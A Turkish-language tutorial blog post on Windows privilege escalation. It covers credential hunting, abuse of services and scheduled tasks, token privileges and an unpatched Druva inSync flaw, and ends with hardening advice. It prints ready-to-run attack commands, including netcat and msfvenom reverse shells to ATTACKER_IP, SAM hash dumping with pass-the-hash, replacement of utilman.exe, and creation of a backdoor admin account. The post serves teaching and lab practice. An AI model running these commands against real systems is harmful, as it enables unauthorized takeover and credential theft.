[Linux tarafında yetki yükseltmeyi](post.html?p=linux-privilege-escalation) daha önce ele almıştım; sıra Windows'ta. Mantık aynı: elimizde düşük yetkili bir erişim var ve hedef, sistemin tam kontrolünü veren **Administrator** ya da **NT AUTHORITY\SYSTEM** hesabına ulaşmak. Windows'ta bu yolculuk genelde üç ana damardan ilerler: **açıkta kalmış kimlik bilgileri**, **yanlış yapılandırılmış servis/görevler** ve **kötüye kullanılabilir kullanıcı ayrıcalıkları (token privileges)**.

Bu yazıda bu damarların hepsini örneklerle geziyorum. Her başlıkta önce tekniğin ne olduğunu, sonra nasıl tespit edildiğini, ardından bir örnekle nasıl istismar edildiğini ve neden çalıştığını anlatıyorum.

> Uyarı: Bu teknikler yalnızca sahibi olduğun ya da test için yazılı izin aldığın sistemlerde denenmelidir (kendi lab'ın, HTB, THM vb.). İzinsiz kullanım suçtur.

## Nereden başlanır: enumeration

Yetki yükseltme her zaman "doğru yanlış yapılandırmayı fark etmek"le başlar. Elle bakarken işe yarayan ilk komutlar:

```cmd
whoami /priv         :: sahip olduğum ayrıcalıklar
whoami /groups       :: üye olduğum gruplar
systeminfo           :: sürüm ve yama bilgisi
```

Bu işi otomatikleştiren araçlar:

- **WinPEAS** — sistemi tarayıp yükseltme yollarını listeleyen çalıştırılabilir/`.bat`. Çıktısı uzundur, dosyaya yönlendir: `winpeas.exe > cikti.txt`
- **PrivescCheck** — WinPEAS'a PowerShell alternatifi, binary çalıştırmaz (AV'ye daha az takılır):
  ```powershell
  Set-ExecutionPolicy Bypass -Scope process -Force
  . .\PrivescCheck.ps1
  Invoke-PrivescCheck
  ```
- **WES-NG** (Windows Exploit Suggester – NG) — hedefe dosya atmamak için **saldırgan makinesinde** çalışır. Hedeften `systeminfo` çıktısını alır, eksik yamalardan çıkan zafiyetleri önerir: `wes.py systeminfo.txt` (önce `wes.py --update`)
- **Metasploit** — Meterpreter oturumun varsa `multi/recon/local_exploit_suggester` modülü uygun exploitleri listeler.

> İpucu: WinPEAS gibi binary'ler AV'ye yakalanıp silinebilir ve "gürültü" çıkarır. Sessiz kalmak istediğinde WES-NG gibi saldırgan tarafında çalışan araçları tercih et.

---

# Bölüm 1 — Açıkta Kalmış Kimlik Bilgileri

Windows sistemlerde parolalar şaşırtıcı derecede sık, düz metin halde bir dosyada ya da kayıt defterinde unutulur. İlk bakılacak yer burasıdır.

## 1. Unattended (gözetimsiz) kurulum dosyaları

**Nedir?** Çok sayıda makineye tek bir Windows imajı dağıtılırken (Windows Deployment Services) kullanıcı etkileşimi gerektirmeyen "gözetimsiz kurulum" yapılır. Bu kurulum başlangıç ayarları için bir yönetici hesabı kullanır ve bu bilgiler makinede kalabilir.

**Tespit:** Şu yolları kontrol et:

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

**Örnek:** Dosyanın içinde kimlik bilgileri gömülü olabilir:

```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

**Neden çalışıyor?** Otomatik kurulum için gereken yönetici parolası, kurulumdan sonra temizlenmeyip dosyada düz metin kalıyor.

## 2. PowerShell geçmişi

**Nedir?** PowerShell çalıştırılan komutları bir dosyada saklar. Bir kullanıcı parolayı doğrudan komut satırına yazdıysa, geçmişte durur.

**Tespit / Örnek:** `cmd.exe`'den:

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Not: `%userprofile%` yalnızca `cmd.exe`'de çalışır. PowerShell'de `$Env:userprofile` kullan.

**Neden çalışıyor?** Kolaylık için tutulan komut geçmişi, parolalı komutları da sakladığı için istemeden bir sır deposu haline geliyor.

## 3. Kayıtlı Windows kimlik bilgileri (cmdkey / runas)

**Nedir?** Windows, başka kullanıcıların kimlik bilgilerini kaydetmeye izin verir. Parolayı göremesek de, kayıtlı bir kimliği `runas` ile kullanabiliriz.

**Tespit:**

```cmd
cmdkey /list
```

**Örnek:** İlgi çekici bir kimlik görürsen, onunla komut çalıştır:

```cmd
runas /savecred /user:admin cmd.exe
```

**Neden çalışıyor?** `/savecred`, daha önce kaydedilmiş parolayı yeniden istemeden kullanır — parolayı bilmesek bile o kullanıcı olarak komut çalıştırırız.

## 4. IIS yapılandırması (web.config)

**Nedir?** IIS, Windows'un varsayılan web sunucusudur. Site yapılandırması `web.config` dosyasında tutulur ve veritabanı bağlantı parolalarını içerebilir.

**Tespit:**

```cmd
type C:\inetpub\wwwroot\web.config | findstr connectionString
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

**Neden çalışıyor?** Uygulamanın veritabanına bağlanması için gereken kimlik bilgileri config dosyasında düz metin durur.

## 5. Yazılımlarda saklı parolalar: PuTTY örneği

**Nedir?** PuTTY, SSH parolasını saklamaz ama **proxy yapılandırmasındaki** kimlik bilgilerini düz metin tutar. Aynı mantık tarayıcılar, e-posta/FTP/VNC istemcileri için de geçerlidir.

**Tespit:**

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Neden çalışıyor?** "Simon Tatham" PuTTY'nin yaratıcısıdır (yoldaki isim odur, kullanıcı adı değil). Kaydedilen proxy parolası `ProxyPassword` altında düz metin durur. Genel ders: **parola saklayan her yazılım, o parolayı geri almanın bir yolunu bırakır.**

---

# Bölüm 2 — Zamanlanmış Görevler ve Servisler

## 6. Zamanlanmış Görevler (Scheduled Tasks)

**Nedir?** Bir zamanlanmış görev, ayrıcalıklı bir kullanıcı olarak çalışıyor ve çağırdığı binary'yi biz değiştirebiliyorsak, o kullanıcının yetkisini ele geçiririz.

**Tespit:** Görevleri listele ve detayına bak:

```cmd
schtasks /query /tn vulntask /fo list /v
```

Önemli iki alan: **Task To Run** (çalışan dosya) ve **Run As User** (hangi kullanıcı). Sonra o dosyanın izinlerini kontrol et:

```cmd
icacls c:\tasks\schtask.bat
```

Çıktıda `BUILTIN\Users:(F)` görürsen (tam erişim), dosyayı değiştirebilirsin demektir.

**Örnek:** `.bat` dosyasını bir ters kabuk (reverse shell) ile değiştir:

```cmd
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Saldırgan tarafında dinleyici başlat, görev tetiklenince kabuk gelir:

```bash
nc -lvp 4444
```

Görevi elle çalıştırma iznin varsa:

```cmd
schtasks /run /tn vulntask
```

**Neden çalışıyor?** Görevi ayrıcalıklı kullanıcı çalıştırıyor ama dosyanın yazma izni bize açık; içeriği biz belirlediğimiz için kodumuz o kullanıcı olarak koşar.

## 7. Servis çalıştırılabilirinde zayıf izinler

**Nedir?** Windows servisleri, Service Control Manager (SCM) tarafından yönetilir ve her servisin bir çalıştırılabilir dosyası ile bir çalışma hesabı vardır. Bu dosyayı değiştirebiliyorsak, servisin hesabının yetkisini alırız.

**Tespit:** Servisi sorgula, sonra binary'nin izinlerine bak:

```cmd
sc qc WindowsScheduler
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

`Everyone:(M)` (modify) ya da `(F)` görürsen istismar edilebilir.

**Örnek:** msfvenom ile bir servis payload'ı üret, hedefe taşı, orijinal binary'yi değiştir:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```

```cmd
cd C:\PROGRA~2\SYSTEM~1\
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
sc stop windowsscheduler & sc start windowsscheduler
```

**Neden çalışıyor?** Servis yeniden başlatıldığında SCM, bizim değiştirdiğimiz binary'yi servisin hesabıyla (örn. `svcusr1`) çalıştırır. Not: PowerShell'de `sc`, `Set-Content`'in takma adıdır — servis için `sc.exe` kullan.

## 8. Tırnaksız servis yolları (Unquoted Service Paths)

**Nedir?** Bir servisin binary yolu boşluk içeriyor ve **tırnak içine alınmamışsa**, SCM komutu ayrıştırırken kararsız kalır ve parçaları sırayla çalıştırmayı dener. Araya kendi çalıştırılabilirimizi koyarak servisi kandırabiliriz.

**Tespit:**

```cmd
sc qc "disk sorter enterprise"
```

`BINARY_PATH_NAME : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` gibi **tırnaksız ve boşluklu** bir yol görürsen adaydır.

SCM şu sırayla arar:

```
C:\MyPrograms\Disk.exe
C:\MyPrograms\Disk Sorter.exe
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

**Örnek:** Yazma iznimiz olan bir noktaya (`icacls C:\MyPrograms` ile `Users`'ın `AD`/`WD` izni olduğunu doğrula) sahte binary'yi koy:

```cmd
move rev-svc2.exe C:\MyPrograms\Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
sc stop "disk sorter enterprise" & sc start "disk sorter enterprise"
```

**Neden çalışıyor?** Komut satırı boşlukları argüman ayracı sayar. `C:\MyPrograms\Disk.exe` gerçek binary'den **önce** aranır; oraya kendi dosyamızı koyduğumuz için servis onu çalıştırır. Genelde binary'ler `C:\Program Files` altındadır ve oraya yazılamaz — ama yönetici standart dışı, herkese yazılabilir bir yola kurmuşsa açık ortaya çıkar.

## 9. Servisin kendi izinlerinde zayıflık (Insecure Service DACL)

**Nedir?** Binary'ye dokunamasak bile, **servisin yapılandırmasını** değiştirme iznimiz (DACL) varsa, servisi istediğimiz binary'yi istediğimiz hesapla (SYSTEM dahil) çalıştıracak şekilde yeniden ayarlayabiliriz.

**Tespit:** Sysinternals `accesschk` ile servis DACL'ine bak:

```cmd
accesschk64.exe -qlc thmservice
```

`BUILTIN\Users: SERVICE_ALL_ACCESS` görürsen servisi yeniden yapılandırabilirsin.

**Örnek:** Servisin binary'sini ve hesabını değiştir (eşittir işaretinden sonraki boşluklara dikkat):

```cmd
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
sc stop THMService & sc start THMService
```

**Neden çalışıyor?** `LocalSystem` en yüksek yetkili hesap. Servisin yapılandırmasını değiştirme yetkimiz olduğu için binary'yi kendi payload'ımıza, hesabı da SYSTEM'e çeviriyoruz — sonuç SYSTEM kabuğu.

## 10. AlwaysInstallElevated

**Nedir?** `.msi` yükleyici dosyaları normalde onu başlatan kullanıcının yetkisiyle çalışır. Ama iki kayıt defteri değeri ayarlanmışsa, herhangi bir (yetkisiz) kullanıcı bile `.msi`'yi **yönetici yetkisiyle** çalıştırabilir.

**Tespit:** İkisinin de `1` olması gerekir:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

**Örnek:** Zararlı `.msi` üret ve çalıştır:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

**Neden çalışıyor?** Bu iki politika açıkken installer, yükleme işlemini SYSTEM yetkisiyle yapar; biz de installer'ın içine kendi payload'ımızı koyarız.

---

# Bölüm 3 — Kötüye Kullanılabilir Ayrıcalıklar (Token Privileges)

Her hesabın belirli sistem görevlerini yapma hakları (privilege) vardır. `whoami /priv` ile listelenir. Saldırgan için bunlardan bazıları doğrudan SYSTEM'e giden kapıdır. ([Priv2Admin](https://github.com/gtworek/Priv2Admin) projesi kapsamlı bir liste sunar.)

## 11. SeBackup / SeRestore

**Nedir?** Bu ayrıcalıklar, DACL'leri yok sayarak **sistemdeki herhangi bir dosyayı okuma ve yazma** hakkı verir (yedekleme amaçlı). Bununla SAM ve SYSTEM kayıt kovanlarını kopyalayıp Administrator parola hash'ini çıkarabiliriz.

**Tespit:** `whoami /priv` çıktısında `SeBackupPrivilege` / `SeRestorePrivilege` (genelde "Backup Operators" grubu üyelerinde).

**Örnek:** Kovanları kaydet:

```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

Saldırgan makinesine taşıyıp hash'leri çıkar:

```bash
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
```

Çıkan Administrator NT hash'iyle **Pass-the-Hash** yap:

```bash
python3 psexec.py -hashes <lm:nt> administrator@<hedef-ip>
```

**Neden çalışıyor?** Yedekleme yetkisi DACL kontrolünü atladığı için normalde okunamayan SAM/SYSTEM'i okuyabiliyoruz. Hash elde edince parolayı kırmaya bile gerek yok — Pass-the-Hash ile doğrudan kimlik doğrulanır.

## 12. SeTakeOwnership

**Nedir?** Bu ayrıcalık, sistemdeki **herhangi bir nesnenin sahipliğini almaya** izin verir. SYSTEM olarak çalışan bir binary'nin sahipliğini alıp onu değiştirebiliriz.

**Tespit:** `whoami /priv` → `SeTakeOwnershipPrivilege`.

**Örnek:** Kilit ekranındaki "Ease of Access" ile SYSTEM olarak çalışan `utilman.exe`'yi hedef alalım. Sahipliğini al, izin ver, yerine `cmd.exe` koy:

```cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
copy cmd.exe utilman.exe
```

Ekranı kilitle → "Ease of Access"e tıkla → SYSTEM yetkili `cmd` açılır.

**Neden çalışıyor?** Sahip olmak tek başına yetki vermez; ama sahipsen kendine tam izin atayabilirsin. `utilman.exe` kilit ekranında SYSTEM olarak çalıştığı için onu `cmd` ile değiştirince SYSTEM kabuğu elde edersin.

## 13. SeImpersonate / SeAssignPrimaryToken

**Nedir?** Bu ayrıcalıklar, bir sürecin **başka kullanıcıları taklit etmesine (impersonation)** izin verir. `LOCAL SERVICE`, `NETWORK SERVICE` ve IIS'in `defaultapppool` hesabı bu yetkiye sahiptir. Bu hesaplardan birini ele geçirirsek, bağlanan ayrıcalıklı bir kullanıcının token'ını ödünç alabiliriz.

**Tespit:** Ele geçirilen süreçte (örn. bir web shell) `whoami /priv` → `SeImpersonatePrivilege`.

**Örnek:** "Potato" ailesinden RogueWinRM. Saldırgan tarafında dinleyici aç, web shell'den exploit'i tetikle:

```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

**Neden çalışıyor?** Herhangi bir kullanıcı BITS servisini başlattığında, sistem 5985 portuna (WinRM) SYSTEM yetkisiyle bir kimlik doğrulama girişimi yapar. WinRM çalışmıyorsa saldırgan sahte bir WinRM servisi açıp bu SYSTEM kimlik doğrulamasını yakalar; `SeImpersonate` sayesinde SYSTEM adına komut çalıştırır.

---

# Bölüm 4 — Yamasız Yazılım

## 14. Güncellenmemiş üçüncü parti yazılım

**Nedir?** İşletim sistemi güncellense de üçüncü parti yazılımlar sık sık ihmal edilir. Kurulu yazılımın sürümünde bilinen bir zafiyet olabilir.

**Tespit:**

```cmd
wmic product get name,version,vendor
```

(Not: `wmic product` her programı listelemeyebilir; masaüstü kısayolları, servisler ve diğer izleri de kontrol et.) Sonra sürüm bilgisini exploit-db, Packet Storm ya da Google'da ara.

**Örnek — Druva inSync 6.6.3:** Bu yazılım, 6064 portunda **SYSTEM yetkisiyle** bir RPC sunucusu çalıştırır ve 5 numaralı prosedürü herhangi bir komutu çalıştırmaya izin verir. İlk yama, komutun `C:\ProgramData\Druva\inSync4\` ile başlamasını şart koştu — ama bu bir **path traversal** ile atlatılabildi:

```
C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c <komut>
```

Böylece izin verilen yolun dışına çıkıp `cmd.exe` çalıştırılabildi. Örnek payload, yeni bir admin kullanıcısı oluşturur:

```
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
```

**Neden çalışıyor?** RPC sunucusu SYSTEM olarak koştuğu için çalıştırdığı her komut SYSTEM yetkisiyle koşar. Yama "yolun başına bak" gibi zayıf bir kontrolle yapıldığı için path traversal ile aşıldı — [File Inclusion yazımdaki](post.html?p=file-inclusion-path-traversal) `../` mantığının aynısı.

---

## Toparlarken

Windows yetki yükseltmenin haritası kabaca üç bölge: **açıkta kalmış sırlar** (unattend, PowerShell geçmişi, web.config, kayıtlı kimlikler), **yanlış yapılandırılmış servis/görevler** (zayıf izinler, tırnaksız yollar, zayıf DACL, AlwaysInstallElevated) ve **kötüye kullanılabilir ayrıcalıklar** (SeBackup, SeTakeOwnership, SeImpersonate). Pratik akış her zaman aynı: **enumerate et → yanlış yapılandırmayı fark et → uygun tekniği uygula.** WinPEAS/PrivescCheck ile hızlan, ama aracın neyi neden işaretlediğini anla.

## Savunma tarafı: bunlar nasıl kapatılır?

- **Sırları temizle.** Kurulum sonrası unattend/sysprep dosyalarını sil; parolaları config dosyalarına düz metin koyma; PowerShell geçmişinde parola bırakma.
- **Servis ve görev izinlerini sıkılaştır.** Servis binary'leri ve zamanlanmış görev betikleri sadece yöneticiler tarafından yazılabilir olsun; `Everyone`/`Users` yazma izni verme.
- **Servis yollarını tırnak içine al.** `"C:\Program Files\...\app.exe"` — boşluklu yolları her zaman tırnakla.
- **AlwaysInstallElevated'ı kapat.** Bu politikayı asla etkinleştirme.
- **Ayrıcalıkları kıs.** `SeImpersonate`, `SeBackup`, `SeTakeOwnership` gibi güçlü yetkileri yalnızca gerçekten gereken hizmet hesaplarına ver.
- **Yamaları güncel tut** — işletim sistemi kadar üçüncü parti yazılımları da. WES-NG mantığıyla eksik yamaları düzenli tara.

En özet haliyle yine aynı ilke: **en az yetki.** Her hesap, her servis, her dosya yalnızca işini görecek kadar yetkiye sahip olmalı — fazlası, birinin tırmanacağı bir basamaktır.
